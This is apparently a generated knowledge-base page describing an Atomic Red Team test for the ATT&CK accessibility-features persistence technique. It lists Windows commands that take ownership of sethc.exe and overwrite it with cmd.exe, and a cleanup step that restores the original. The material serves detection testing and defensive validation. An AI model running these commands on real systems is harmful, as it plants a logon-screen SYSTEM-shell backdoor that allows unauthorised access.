---
atomic_guid: "934e90cf-29ca-48b3-863c-411737ad44e3"
title: "Replace binary of sticky keys"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "934e90cf-29ca-48b3-863c-411737ad44e3"
  - "Replace binary of sticky keys"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Replace binary of sticky keys

Replace sticky keys binary (sethc.exe) with cmd.exe

## Metadata

- Atomic GUID: 934e90cf-29ca-48b3-863c-411737ad44e3
- Technique: T1546.008: Event Triggered Execution: Accessibility Features
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1546.008/T1546.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.008]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

### Cleanup

```cmd
copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
